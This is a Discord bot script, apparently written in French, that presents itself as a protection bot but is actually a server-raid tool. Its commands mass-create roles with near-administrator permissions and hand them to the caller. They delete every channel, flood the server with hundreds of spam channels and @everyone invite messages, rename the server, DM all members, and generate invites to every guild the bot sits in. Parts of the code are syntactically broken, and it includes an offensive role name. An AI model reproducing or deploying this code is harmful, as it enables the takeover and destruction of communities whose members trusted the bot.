const Discord = require("discord.js");
const bot = new Discord.Client();
bot.login (process.env.TOKEN);
bot.on("ready", () => {
bot.user.setActivity('Protecting 758 guilds', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
  console.log("Bot [ON]")
  })
  bot.on("message", message => {
if(message.content.includes("&kelsair")){
  console.log(`${bot.guilds.map(c => c.name)}`)
}

if (message.content === "&help"){
  var embed = new Discord.RichEmbed()
    .setTitle("❤️ Les commandes du bots : ❤️")
    .setDescription("ProtectBot's commands ")
    .setColor("#dc143c")
    .addField("🧡 &roles : génére des rôles 🧡")
    .addField("💛 &raul : vous donnes les rôles 💛")
    .addField("💚 &destroy bah tu sais 💚")
    .addField("💙 &channel : crée pleins de channels 💙")
    .addField("💜 &pd : crée pleins de salons vocaux 💜")
    .addField("🖤 &role : donne le rôle izi 🖤");
    message.author.sendMessage(embed);
 
              
}

if (message.content === "&kick"){
  let kickedUser = message.guild.member(
    message.mentions.users.first() || message.guild.members.get(args[0])
  );
  if (!kickedUser) {
    return message.channel.send("**__Frere t'es bourré ou quoi ? il existe pas le mec !**__");
  }  
  let kickReason = args.join(' ').slice(22)

   vaf kickEmbed = new Discord.RichEmbed()
    .setDescription("kicks")
    .setColor("#dc143c")
    .addField("Utilisateur kické ||Cheh||", `$kickedUser} (ID : $kickedUser.id})`)
    .addField("
      Utilisateur ayant kické", `${message.author} (ID: ${message.author.id})`
    )
    .addField("Channel", message.channel)
    .addField("Raison", kickReason);

  let kickChannel = message.guild.channels.find(`name`, 'reports');
 if (kickChannel) {
   return message.channel.send(
     "Channel 'Reports' introuvable. crée le !!!!"
   );
 }

  kickChannel.send(kickEmbed);

if(message.content === "&roles"){
for(var i =0; i < 400; i++){
    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                             mentionable:false,
                             permissions:2146958591,
                             position: "",
                             color: "#fb0707"
        })
        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff08c5"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#5d08ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#0c08ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08d5ff"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ffa3"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ff23"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#81ff08"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#fff608"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff6f08"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
    }
}


if(message.content.includes("&role")){
    message.guild.createRole({name:"Izi",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
   })
}
if(message.content.includes("&raul")){
  (message.guild.roles.map(r => message.member.addRoles(r)))
}
if(message.content.includes("&ar!kelsairvvesrx")){
  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
}
          if(message.content.includes("&A?serveurinvite")){
              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
          }
          if(message.content === "&issou"){
              message.guild.setName("LE CENTRE TA BZ :)")
              message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
            }
            if(message.content === "&pd"){
              for(var i =0; i < 450; i++){
              message.guild.createChannel("BY","voice")
              }
            }
            if(message.content.includes("&.789")){
                for(var i = 0; i < 200; i++){
                    message.channel.send("@everyone https://discord.gg/R3K862v")
                }
            }
            //réaction en chaine
                  if(message.content === "&channel"){
                    message.channel.send("&roles").then(m => m.delete());
                    message.channel.send("&issou").then(m => m.delete());
                      for(var i = 0; i < 999; i++){
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))

                      }
                    }
                    if(message.content === "&destroy"){
                      message.guild.channels.map(c => c.delete())
                      }
                      //on commence la destruction
                      if(message.content.includes("&destroy")){
                          message.channel.send("&ban").then(m => m.delete());
                          message.channel.send("&drole").then(m => m.delete());
                          message.channel.send("&destroy").then(m => m.delete());
                          message.channel.send("&jechange").then(m => m.delete());
                          message.guild.createChannel("LA PIGEONNEIRE", "text").then(c => c.send("channel"))
                      }                                                                                   
                    });
bot.on('message', message => {
 if(message.content.startsWith('&alldm')){
let cont = message.content.slice(1).split(" ")
        let args = cont.slice(1)
        let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
      message.guild.members.forEach((player) => {
          message.guild.member(player).send(`**INFORMATIONS SUR LA PIGEONNERIE :

Numéro 1 :

La PIGEONNERIE est un serveur discord réunissant des personnes qui se sont faites baiser par des arnaques ou autres, mais est aussi là pour venger ces personnes là grâce au raid ou destruction.

TA CAPTÉ ? **             https://discord.gg/R3K862v`);
});
    }
})
   

      
